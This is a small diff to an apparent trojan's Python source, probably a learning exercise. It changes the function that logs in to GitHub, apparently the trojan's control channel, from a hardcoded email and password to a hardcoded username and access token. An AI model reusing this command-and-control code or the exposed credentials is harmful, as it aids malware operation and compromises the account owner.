@@ -58,8 +58,8 @@ def create_trojan_id():
 
 
 def connect_to_github():
-    gh = login(username='alanj.harris14@gmail.com', password='x7HoUD6bRRBWHLi')
-    repo = gh.repository('alanj.harris14@gmail.com', 'capter7')
+    gh = login(username='yokai117', token='bb9af41d1c17529b51cc7f52481aac6d953d5937')
+    repo = gh.repository('yokai117', 'capter7')
     branch = repo.branch('master')
     return gh, repo, branch
 
